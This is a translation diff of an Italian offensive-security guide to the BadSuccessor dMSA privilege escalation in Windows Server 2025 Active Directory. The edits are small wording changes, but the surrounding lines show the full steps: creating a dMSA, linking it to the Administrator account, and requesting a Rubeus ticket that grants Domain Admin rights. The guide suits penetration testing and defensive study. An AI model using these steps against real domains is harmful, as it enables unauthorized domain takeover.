@@ -17,13 +17,13 @@ I ricercatori di Akamai hanno scoperto che un singolo attributo — **`msDS‑Ma
 
 ## Requirements to attack
 1. **Almeno un Windows Server 2025 DC** affinché la classe LDAP del dMSA e la logica KDC esistano.
-2. **Qualsiasi diritto di creazione di oggetti o scrittura di attributi su un OU** (qualsiasi OU) – ad esempio, `Create msDS‑DelegatedManagedServiceAccount` o semplicemente **Create All Child Objects**. Akamai ha scoperto che il 91 % dei tenant nel mondo reale concede tali permessi “benigni” sugli OU a non amministratori.
+2. **Qualsiasi diritto di creazione di oggetti o scrittura di attributi su un OU** (qualsiasi OU) – ad esempio, `Create msDS‑DelegatedManagedServiceAccount` o semplicemente **Create All Child Objects**. Akamai ha scoperto che il 91 % dei tenant nel mondo reale concede tali permessi “benigni” sugli OU a non amministratori.
 3. Capacità di eseguire strumenti (PowerShell/Rubeus) da qualsiasi host unito al dominio per richiedere ticket Kerberos.
 *Non è richiesto alcun controllo sull'utente vittima; l'attacco non tocca mai direttamente l'account target.*
 
 ## Step‑by‑step: BadSuccessor*privilege escalation
 
-1. **Trova o crea un dMSA che controlli**
+1. **Individua o crea un dMSA che controlli**
 ```bash
 New‑ADServiceAccount Attacker_dMSA `
 ‑DNSHostName ad.lab `
@@ -36,7 +36,7 @@ Poiché hai creato l'oggetto all'interno di un OU a cui puoi scrivere, possiedi 
 - Imposta `msDS‑ManagedAccountPrecededByLink = DN` di qualsiasi vittima (ad esempio `CN=Administrator,CN=Users,DC=lab,DC=local`).
 - Imposta `msDS‑DelegatedMSAState = 2` (migrazione completata).
 
-Strumenti come **Set‑ADComputer, ldapmodify**, o anche **ADSI Edit** funzionano; non sono necessari diritti di amministratore di dominio.
+Strumenti come **Set‑ADComputer, ldapmodify** o anche **ADSI Edit** funzionano; non sono necessari diritti di amministratore di dominio.
 
 3. **Richiedi un TGT per il dMSA** — Rubeus supporta il flag `/dmsa`:
 
@@ -44,7 +44,7 @@ Strumenti come **Set‑ADComputer, ldapmodify**, o anche **ADSI Edit** funzionan
 Rubeus.exe asktgs /targetuser:attacker_dmsa$ /service:krbtgt/aka.test /dmsa /opsec /nowrap /ptt /ticket:<Machine TGT>
 ```
 
-Il PAC restituito ora contiene il SID 500 (Amministratore) più i gruppi Amministratori di Dominio/Amministratori di Impresa.
+Il PAC restituito ora contiene il SID 500 (Amministratore) più i gruppi Domain Admins/Enterprise Admins.
 
 ## Gather all the users passwords
 
